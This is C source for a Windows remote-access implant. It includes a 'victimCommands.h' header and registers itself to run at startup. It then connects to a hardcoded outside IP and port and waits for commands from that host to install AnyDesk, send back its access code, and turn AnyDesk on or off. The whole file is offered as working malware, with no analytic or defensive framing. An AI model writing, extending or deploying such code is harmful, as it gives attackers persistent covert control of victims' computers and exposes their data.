#include <stdio.h>
#include <Windows.h>
#include <stdbool.h>
#include "victimCommands.h"

#define PORT 11091
#define IP "52.14.18.129"

// Functions
void connectToHost();
void getCommands();
void processCommand(int command);

// Global variables
int serverSocket;

void connectToHost()
{
    /*
    Connects to the host
    */

    struct sockaddr_in hostAddress;
    WSADATA wsaData;

    // Initialize Winsock
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
    {
        printf("WSAStartup failed: %d\n", iResult);
        exit(1);
    }

    // Creates the socket
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == -1)
    {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created..\n");

    // Defines the host IP & PORT
    hostAddress.sin_family = AF_INET;
    hostAddress.sin_addr.S_un.S_addr = inet_addr(IP);
    hostAddress.sin_port = htons(PORT);

    // Connects to the host
    if (connect(serverSocket, (struct sockaddr *)&hostAddress, sizeof(hostAddress)) != 0)
    {
        printf("connection with the server failed...\n");
        exit(0);
    }
    else
        printf("connected to the server..\n");
}

void getCommands()
{
    /*
    Waits for the commands from the host and processes them 
    */

    int command = -1;

    while (true)
    {
        // Gets the command
        recv(serverSocket, (char *)&command, sizeof(command), 0);
        command = ntohl(command);
        processCommand(command);
    }
}

void processCommand(int command)
{
    /*
    Porcess [command]

    param 1: the command from the host
    */

    switch (command)
    {
    case 0:
        installAnyDesk(serverSocket);
        break;

    case 1:
        sendCode(serverSocket);
        break;
    case 2:
        powerOnAnyDesk();
        break;
    case 3:
        powerOffAnyDesk();
        break;

    default:
        break;
    }
}

int main(int argc, char const *argv[])
{
    setAnyDeskFilePath();
    addProgramToStartup();
    connectToHost();
    getCommands();
    return 0;
}
